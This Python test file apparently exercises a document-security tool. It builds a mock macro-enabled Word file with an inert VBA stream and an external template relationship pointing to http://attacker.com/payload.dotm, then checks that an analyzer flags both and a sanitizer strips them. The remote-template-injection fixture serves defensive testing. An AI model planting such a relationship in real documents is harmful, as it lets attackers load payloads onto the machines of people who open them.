import pytest
import zipfile
from app.analyzers.office_analyzer import OfficeAnalyzer
from app.sanitizers.office_sanitizer import OfficeSanitizer
from app.sanitizers.base import SanitizationOptions

def test_office_macro_detection_and_disarm(temp_dir):
    docx_path = temp_dir / "invoice_with_macro.docm"

    # Create OpenXML structure with macro stream and external relationship
    with zipfile.ZipFile(docx_path, 'w') as zf:
        zf.writestr("[Content_Types].xml", '<Types><Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
        zf.writestr("_rels/.rels", '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://attacker.com/payload.dotm" TargetMode="External"/></Relationships>')
        zf.writestr("word/vbaProject.bin", b"\xD0\xCF\x11\xE0" + b"Mock VBA Stream AutoOpen")
        zf.writestr("docProps/core.xml", '<coreProperties><dc:creator>Adversary</dc:creator></coreProperties>')

    analyzer = OfficeAnalyzer()
    res = analyzer.analyze(docx_path, docx_path.name, "application/vnd.ms-word.document.macroEnabled.main+xml")

    # Verify macro detection
    assert res.data["has_macros"] is True
    macro_findings = [f for f in res.findings if "MACROS DETECTED" in f.title]
    assert len(macro_findings) > 0

    # Verify external template injection detection
    assert res.data["has_external_relationships"] is True

    # Now execute Sanitizer
    clean_path = temp_dir / "clean_invoice.docx"
    sanitizer = OfficeSanitizer()
    opts = SanitizationOptions(
        profile="security",
        remove_macros=True,
        remove_external_links=True,
        remove_metadata=True
    )

    clean_res = sanitizer.sanitize(docx_path, clean_path, opts, docx_path.name)
    assert clean_res.success is True
    assert clean_path.exists()

    # Re-analyze clean document: macro and external relationships must be gone!
    with zipfile.ZipFile(clean_path, 'r') as clean_zf:
        namelist = clean_zf.namelist()
        assert "word/vbaProject.bin" not in namelist
        # Verify external target was stripped from .rels
        rels_content = clean_zf.read("_rels/.rels").decode('utf-8')
        assert "attacker.com" not in rels_content
